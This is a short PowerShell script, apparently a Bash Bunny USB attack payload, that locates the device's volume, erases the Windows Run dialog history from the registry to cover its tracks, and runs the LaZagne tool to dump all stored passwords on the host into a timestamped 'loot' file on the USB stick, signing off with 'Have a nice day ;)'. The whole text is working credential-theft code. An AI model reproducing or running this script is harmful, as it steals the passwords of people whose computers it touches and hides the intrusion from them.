# Vars for log
$destFile = ("$env:COMPUTERNAME-{0:yyyy-MM-dd-HH-mm-ss}.log" -f (Get-Date))
$ToolPath = ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'bin')
$destPath = ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'loot\Garfield')
$dest = "$destPath\$destFile"

# Clear Run history
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name * -ErrorAction SilentlyContinue

# Get passwords
& $ToolPath\lazagne.exe all | Out-File -FilePath $dest -Encoding ASCII

Add-Content -Path $dest -Value ""
Add-Content -Path $dest -Value "Have a nice day ;)"
